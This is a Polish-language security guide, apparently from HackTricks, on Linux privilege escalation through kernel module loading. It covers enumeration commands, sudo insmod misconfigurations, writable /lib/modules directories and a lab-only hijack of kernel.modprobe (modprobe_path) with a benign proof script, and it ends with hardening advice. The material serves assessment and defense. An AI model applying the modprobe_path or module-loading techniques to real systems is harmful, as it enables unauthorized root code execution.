# Nadużywanie modułów kernela i modprobe

{{#include ../../banners/hacktricks-training.md}}

## Błędne konfiguracje modułów kernela i ładowania modułów

Obsługa modułów kernela to obszar o dużym wpływie podczas analizy eskalacji uprawnień w Linuxie. Nie traktuj każdego komunikatu o niepodpisanym module jako podatności możliwej do wykorzystania, ale użyj go do uzyskania odpowiedzi na praktyczne pytania:

- Czy bieżący użytkownik może ładować moduły przez `sudo`, capabilities lub zapisywalną ścieżkę pomocniczą?
- Czy ładowanie modułów jest nadal włączone?
- Czy wymuszanie podpisów modułów jest wyłączone?
- Czy katalogi modułów lub pliki modułów są zapisywalne?
- Czy można odczytywać logi kernela, aby potwierdzić, co się wydarzyło?

Szybki triage:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Interpretacja:

- `modules_disabled=1` oznacza, że nowe moduły nie mogą być ładowane do czasu ponownego uruchomienia systemu.
- `module_sig_enforce=1` zazwyczaj blokuje niepodpisane moduły.
- `dmesg_restrict=0` pozwala użytkownikom nieuprzywilejowanym odczytywać logi kernela w wielu systemach.
- Zapisywalne ścieżki w `/lib/modules/$(uname -r)/` są niebezpieczne, ponieważ mechanizmy wykrywania i automatycznego ładowania modułów mogą ufać temu drzewu.

### Ładowanie modułu i odczytywanie danych wyjściowych kernela

Jeśli masz uzasadnione uprawnienia do załadowania lokalnego modułu, `insmod` wstawia dokładnie wskazany przez Ciebie plik `.ko`. Funkcja inicjalizacyjna modułu uruchamia się natychmiast, a komunikaty zapisane za pomocą `printk()` pojawiają się w logach kernela.

Minimalny workflow do przeglądu lub środowisk laboratoryjnych:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Jeśli `sudo -l` zezwala na użycie `insmod`, `modprobe` lub wrappera opakowującego te polecenia, potraktuj to jako krytyczne:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Dozwolone przez `sudo` `insmod`

Reguła `sudo`, która pozwala użytkownikowi uruchamiać `insmod`, nie jest porównywalna z zezwoleniem na uruchamianie zwykłego pomocniczego narzędzia administracyjnego. Kod inicjalizacyjny modułu jest wykonywany w kontekście jądra natychmiast po wstawieniu pliku `.ko`, więc praktyczne pytanie podczas analizy brzmi: „czy ten użytkownik może wybrać lub zmodyfikować ładowany moduł?”

Ogólny przebieg analizy:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Jeśli użytkownik może dostarczyć dowolny plik `.ko`, w ramach autoryzowanej oceny należy traktować tę regułę jako pełne przejęcie systemu. Bezpieczniejszym rozwiązaniem operacyjnym jest unikanie delegowania ładowania modułów przez sudo; jeśli jest to nieuniknione, należy ograniczyć dokładną ścieżkę, właściciela, uprawnienia, politykę podpisywania oraz procedurę usuwania.

W przypadku nieszkodliwego wzorca budowania modułu w kontrolowanym laboratorium minimalne źródło i Makefile wyglądają następująco:
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Buduj i ładuj wyłącznie w autoryzowanym laboratorium:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Kontrole nadużycia `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` kontroluje pomocnika userspace wywoływanego przez kernel, gdy potrzebuje pomocy przy ładowaniu modułu. Jeśli attacker może zmienić go na ścieżkę do zapisywalnego pliku wykonywalnego i wywołać nieznany format binarny lub inną ścieżkę żądania modułu, może to doprowadzić do wykonania kodu jako root.

Sprawdź bieżącego pomocnika:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Sprawdź, czy możesz na to wpłynąć:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Ogólny schemat wyłącznie do celów laboratoryjnych:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
W zahartowanych systemach powinno to zakończyć się niepowodzeniem, ponieważ użytkownicy nieuprzywilejowani nie mogą zapisywać do `kernel.modprobe`, ścieżka pomocnika nie jest zapisywalna lub ścieżki ładowania modułów są zablokowane.

### Przegląd zapisywalnego `/lib/modules`

Zapisywalne katalogi modułów mogą umożliwiać podmianę modułów, umieszczanie złośliwych modułów lub nadużywanie automatycznego ładowania — zależnie od tego, jak później wywoływany jest `modprobe`.

Sprawdź zapisywalne lokalizacje:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Jeśli znajdziesz zawartość modułu z uprawnieniami zapisu, sprawdź, jak moduły są wykrywane:
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Uwagi dotyczące ochrony:

- Utrzymuj `/lib/modules` jako własność `root:root` i bez możliwości zapisu przez użytkowników.
- Ustaw `kernel.modules_disabled=1` po uruchomieniu systemu, jeśli jest to możliwe operacyjnie.
- Wymuś podpisywanie modułów w systemach wymagających modułów ładowalnych.
- Monitoruj zapisy do `/proc/sys/kernel/modprobe`, `/lib/modules` oraz nieoczekiwane uruchomienia `insmod`/`modprobe`.
